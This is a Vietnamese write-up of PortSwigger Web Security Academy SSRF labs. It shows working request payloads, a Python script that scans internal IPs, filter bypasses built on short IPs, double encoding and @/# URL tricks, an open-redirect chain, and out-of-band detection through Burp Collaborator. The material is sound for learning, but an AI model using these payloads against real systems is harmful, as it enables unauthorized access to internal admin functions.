# SSRF
 
![image](https://user-images.githubusercontent.com/68894302/168878073-3bfd2ce3-d68e-4f5a-b819-53577a44ff75.png)

 
## Lab: Basic SSRF against the local server
 
Thông thường chúng ta không thể truy cập vào chức năng quản trị viên ví dụ như /admin khi chưa được xác thực. Nhưng khi truy cập vào URL /admin từ localhost thì một số kiểm tra có thể bị bỏ qua:
 
```
POST /product/stock HTTP/1.1
Host: ac811fc91fa9cb6bc0ec9237009000c1.web-security-academy.net
 
stockApi=http://127.0.0.1/admin
 
 
HTTP/1.1 200 OK
 
<a href="/admin/delete?username=carlos">Delete</a>
```
 
như phản hồi ta thấy server đã fetch lại nội dung trong /admin và trả lại cho người dùng, từ đó ta xóa người dùng carlos và giải quyết thử thách
 
Note:
 
Tại sao các ứng dụng hoạt động theo cách này và mặc nhiên tin tưởng các yêu cầu đến từ máy cục bộ?  Điều này có thể phát sinh vì nhiều lý do:
+ Access control có thể được triển khai trong một thành phần khác nằm phía front-end của server. Khi một kết nối được thực hiện trở lại chính máy chủ, việc kiểm tra sẽ bị bỏ qua.
+ Với mục đích recovery thảm họa, ứng dụng có thể cho phép truy cập quản trị mà không cần đăng nhập, cho bất kỳ người dùng nào đến từ máy cục bộ. Điều này cung cấp một cách để quản trị viên khôi phục hệ thống trong trường hợp họ mất thông tin đăng nhập. Giả định ở đây là chỉ một người dùng hoàn toàn đáng tin cậy mới đến trực tiếp từ chính máy chủ.
+ Giao diện quản trị có thể đang lắng nghe trên một số port khác vì thế người dùng có thể không truy cập trực tiếp được.
 
---
## Lab: Basic SSRF against another back-end system
 
### Description
Phòng thí nghiệm này có tính năng kiểm tra kho, lấy dữ liệu từ hệ thống nội bộ.
 
Để giải quyết phòng thí nghiệm, hãy sử dụng chức năng kiểm tra kho để quét phạm vi 192.168.0.X nội bộ để tìm giao diện quản trị trên cổng 8080, sau đó sử dụng chức năng này để xóa carlos của người dùng.
 
### Analysis
 
Có một loại mối quan hệ khác thường phát sinh SSRF là khi máy chủ có thể tương tác với các hệ thống back-end khác mà người dùng có thể truy cập trực tiếp. Các hệ thống này thường có địa chỉ ip private không thể định tuyến được. Vì thế trong một số trường hợp SSRF chúng ta cần tìm ra địa chỉ ip của máy chủ để thực hiện exploit.
 
Dưới đây là script để tìm IP
```python
 
import requests
 
URL = 'https://ac771f041f635a7cc0a9310100a90041.web-security-academy.net/product/stock'
cookies = {'session': 'OKHuNr4TQlvXPTluBx79JBlrWoXUQGAs',}
 
for i in range(1,256):
    data = {
    'stockApi': f'http://192.168.0.{i}:8080/admin'
    }
 
    r  = requests.post(URL, cookies=cookies, data=data)
    if r.status_code == 200: # response 500 server error is not ip correct
        print (i, "OK")
        break
    else:
        print(i, "Fail")
 
```
 
```
110 Fail
111 Fail
112 Fail
113 Fail
114 Fail
115 Fail
116 Fail
117 OK
```
=> địa chỉ ip của server là 192.168.0.117
```
POST /product/stock HTTP/1.1
Host: ac771f041f635a7cc0a9310100a90041.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
 
stockApi=http://192.168.0.117:8080/admin/delete?username=carlos
```
 
---
 
## Lab: SSRF with blacklist-based input filter

Challenge này có blacklist có thể chứa

```
127.0.0.1
admin
```
Chúng ta có thể bypass địa chỉ 127.0.0.1 bằng cách dùng short url loại bỏ đi một số kí tự 0. Bypass `a` bằng cách dùng url double encode %25%36%31

payload cuối cùng là:
```
stockApi=http://127.0.1/%25%36%31dmin
```

Sau đó phản hồi đưa chúng ta đến với trang quản trị admin panel
```
<div>
<span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
<div>
```
Sau đó xóa tên carlos và giải quyết challenge. Kí tự `a` trong carlos cũng phải double encode để bypass.

```
POST /product/stock HTTP/1.1
Host: ac181f661f9946c1c05d8a4f007d0065.web-security-academy.net

stockApi=http://127.0.1/%25%36%31dmin/delete?username=c%25%36%31rlos


HTTP/1.1 302 Found
Location: /admin
```

---

## Lab: SSRF with filter bypass via open redirection vulnerability

Challenge tồn tại SSRF và lỗ hổng chuyển hướng mở, xâu chuỗi 2 cái này lại và ta có thể chuyển hướng đến trang của quản trị viên
Đầu tiên lỗ hổng open redirect khi chúng ta chọn "Next Product", URL trả về như sau:

```
GET /product/nextProduct?currentProductId=3&path=/product?productId=4 HTTP/1.1
```
Nhận thấy rằng tất cả những gì được đặt vào tham số path đều được chuyển hướng

```
GET /product/nextProduct?currentProductId=10&path=https://google.com HTTP/1.1

HTTP/1.1 302 Found
Location: https://google.com
```

Nên sau khi đặt payload SSRF và kết hợp open redirect chúng ta có thể chuyển đến admin

```
POST /product/stock HTTP/1.1

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin


HTTP/1.1 200 OK

<a href="/admin">Admin panel</a>
<a href="/http://192.168.0.12:8080/admin/delete?username=carlos">Delete</a>
```

Xóa người dùng carlos để giải quyết challenge.

```
<p>User deleted successfully!</p>
```

---

## Lab: Blind SSRF with out-of-band detection

Cách dễ dàng để phát hiện blind ssrf nhất là dùng kĩ thuật oob. Kĩ thuật này liên quan đến việc cố gắng kích hoạt một yêu cầu HTTP đến một hệ thống bên ngoài mà chúng ta kiểm soát và giám sát các tương tác mạng với hệ thống đó.

Khi thực hiện các yêu cầu tài nguyên đối với một miền khác, Referer header chứa địa chỉ của trang sử dụng tài nguyên được yêu cầu. Chúng ta sẽ chèn vào header này một url trong trường hợp này dùng burp collaborator vì challenge không cho phép chèn url của bên thứ 3.

Quan sát phản hồi sau khi Poll có phần secret:
```
GET /product?productId=1 HTTP/1.1
Host: ac7d1f681e764ed7c01215bf000600bf.web-security-academy.net
Referer: https://deviuoqyjyfmx3a9bjn0ufjllcr2fr.burpcollaborator.net

--> sau khi poll

<html>
<body>x8yo2lsoga95yt249z7zyuzjigz</body>
</html>
```

---

## Lab: SSRF with whitelist-based input filter

Với whitelist chúng ta có thể kết hợp các kĩ thuật lại với nhau: 
+ Nhúng thông tin đăng nhập trước tên máy chủ sử dụng `@`
Ví dụ: https://user@host_evil
+ Dùng kí tự `#` để chỉ ra một phân đoạn url
Ví dụ: https://host_evil#foo
+ encode url để gây nhầm lẫn với trình phân tích cú pháp url

Đầu tiên thử một yêu cầu tới 127.0.0.1 chúng ta nhận thấy stock.weliketoshop.net phải được bao gồm trong request
![image](https://user-images.githubusercontent.com/68894302/168491260-d9efcaad-ba33-496d-8592-d6a45d7e64dd.png)

Thêm` `user@` vào để kiểm tra xem ứng dụng có chấp nhận thông tin đăng nhập không
![image](https://user-images.githubusercontent.com/68894302/168491349-d6217667-5bc1-48a1-9877-e3fa5ab6c65a.png)

Sử dụng dấu `#` để chỉ ra phân đoạn url, nhưng bị filter nên bỏ qua bằng cách double encode url thành %2523. Thay thế tên đăng nhập bằng địa chỉ localhost và quan sát phản hồi
![image](https://user-images.githubusercontent.com/68894302/168491892-3b8211b5-22ab-47e9-a73f-dca10b32e183.png)

Xóa người dùng carlos và giải quyết challenge
![image](https://user-images.githubusercontent.com/68894302/168491954-6ccdacd1-3c30-426b-8ed3-78ae84fa15b1.png)









